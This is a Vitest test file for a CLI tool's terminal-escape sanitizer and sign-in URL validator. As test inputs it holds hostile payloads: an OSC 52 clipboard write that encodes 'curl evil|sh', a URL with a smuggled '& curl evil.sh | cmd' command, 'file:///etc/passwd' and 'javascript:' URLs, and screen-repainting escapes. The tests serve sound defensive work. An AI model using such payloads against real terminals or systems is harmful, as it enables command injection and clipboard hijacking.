import { describe, expect, it } from "vitest";

import { sanitize, stripAnsi, visibleWidth } from "../src/ansi.js";
import { letterOf } from "../src/hook.js";
import { safeUrl } from "../src/screen.js";
import { asPick } from "../src/types.js";

const ESC = String.fromCharCode(27);
const BEL = String.fromCharCode(7);
const NUL = String.fromCharCode(0);

describe("sanitize", () => {
  it("removes the clipboard write, which is the worst of them", () => {
    expect(sanitize(`${ESC}]52;c;Y3VybCBldmlsfHNo${BEL}ok`)).toBe("ok");
  });

  it("removes cursor control, which can repaint the sign-in warning", () => {
    for (const attack of [
      `${ESC}[2J${ESC}[H`,
      `${ESC}[1A${ESC}[2K`,
      `${ESC}[?1049h`,
      `${ESC}[6n`,
    ]) {
      expect(sanitize(`${attack}ok`), attack).toBe("ok");
    }
  });

  it("removes OSC, DCS and two-character escapes", () => {
    expect(sanitize(`${ESC}]0;title${BEL}ok`)).toBe("ok");
    expect(sanitize(`${ESC}P+q544e${ESC}\\ok`)).toBe("ok");
    expect(sanitize(`${ESC}cok`)).toBe("ok");
  });

  it("removes raw control bytes but keeps tab and newline", () => {
    expect(sanitize(`a${NUL}b${String.fromCharCode(8)}c`)).toBe("abc");
    expect(sanitize("a\tb\nc")).toBe("a\tb\nc");
  });

  it("keeps our own colour, or the whole surface goes monochrome", () => {
    const painted = `${ESC}[38;5;209mcoral${ESC}[0m`;
    expect(sanitize(painted)).toBe(painted);
  });

  it("caps a payload that is no longer copy", () => {
    expect(sanitize("x".repeat(10_000)).length).toBe(4000);
    expect(sanitize("x".repeat(50), 10)).toHaveLength(10);
  });

  it("measures width without counting escapes as columns", () => {
    expect(visibleWidth(`${ESC}[38;5;209mcoral${ESC}[0m`)).toBe(5);
    expect(visibleWidth(`${ESC}]52;c;AAAA${BEL}coral`)).toBe(5);
  });

  it("strips colour too when the destination is a pipe", () => {
    expect(stripAnsi(`${ESC}[38;5;209mcoral${ESC}[0m`)).toBe("coral");
  });
});

describe("safeUrl", () => {
  it("normalises a value that was shell syntax when spawned through cmd.exe", () => {
    const parsed = safeUrl("https://atomicreps.com/connect & curl evil.sh | cmd");
    expect(parsed).not.toBeNull();
    expect(parsed).not.toContain(" ");
    expect(parsed?.startsWith("https://atomicreps.com/")).toBe(true);
  });

  it("refuses a scheme a browser would hand to another application", () => {
    for (const url of [
      "file:///etc/passwd",
      "vnc://host",
      "javascript:alert(1)",
      "http://atomicreps.com/connect",
    ]) {
      expect(safeUrl(url), url).toBeNull();
    }
  });

  it("refuses a host that is not ours", () => {
    expect(safeUrl("https://atomicreps.com.evil.test/connect")).toBeNull();
    expect(safeUrl("https://evil.test/connect")).toBeNull();
  });

  it("refuses a non-string and an absurd length", () => {
    expect(safeUrl(undefined)).toBeNull();
    expect(safeUrl(42)).toBeNull();
    expect(safeUrl({ toString: () => "https://atomicreps.com" })).toBeNull();
    expect(safeUrl(`https://atomicreps.com/${"x".repeat(600)}`)).toBeNull();
  });

  it("passes our own sign-in URL", () => {
    expect(safeUrl("https://atomicreps.com/connect")).toBe("https://atomicreps.com/connect");
  });
});

describe("the letter a rep is answered with", () => {
  it("accepts A to D and nothing past it", () => {
    for (const letter of ["A", "B", "C", "D", "a", "b", "c", "d"]) {
      expect(asPick(letter), letter).toBe(letter.toUpperCase());
    }
    for (const letter of ["E", "F", "e", "f", "G", "1", "", "AB"]) {
      expect(asPick(letter), letter).toBeNull();
    }
  });

  it("reads the letter out of a prompt the same way", () => {
    expect(letterOf("B")).toBe("B");
    expect(letterOf("c.")).toBe("C");
    expect(letterOf(" d) because")).toBe("D");
    expect(letterOf("E")).toBeNull();
    expect(letterOf("f)")).toBeNull();
  });

  it("ignores anything long enough to be a real message", () => {
    expect(letterOf(`A ${"x".repeat(80)}`)).toBeNull();
  });
});
